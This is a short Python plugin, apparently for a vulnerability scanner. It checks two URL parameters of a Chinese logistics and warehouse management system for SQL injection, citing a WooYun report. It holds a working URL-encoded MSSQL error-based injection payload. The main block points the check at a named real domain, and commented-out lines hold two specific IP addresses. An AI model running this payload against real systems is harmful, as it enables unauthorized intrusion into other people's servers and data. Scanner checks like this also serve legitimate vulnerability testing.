#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:xq17
#Name:英赛特物流仓储管理系统互联网客户服务平台2处通用SQL注入漏洞 
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0129392

def assign(service,arg):
    if service=="insight":
        return True,arg 


def  audit(arg):
    ps=[
        "csccmis/jctxx.asp?jcid=",
        "csccmis/jczp.asp?jcid=",
            ]
    data = "%27%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
    for p in ps:
        url=arg+p+data
        code,head,res,errcode,_=curl.curl2(url)
        
        if code==500 and "testXQ17" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('insight','http://www.nbzhwl.cn/')[1])
    # audit(assign('insight','http://61.153.150.206:6666/')[1])
    # audit(assign('insight','http://60.190.16.166/')[1])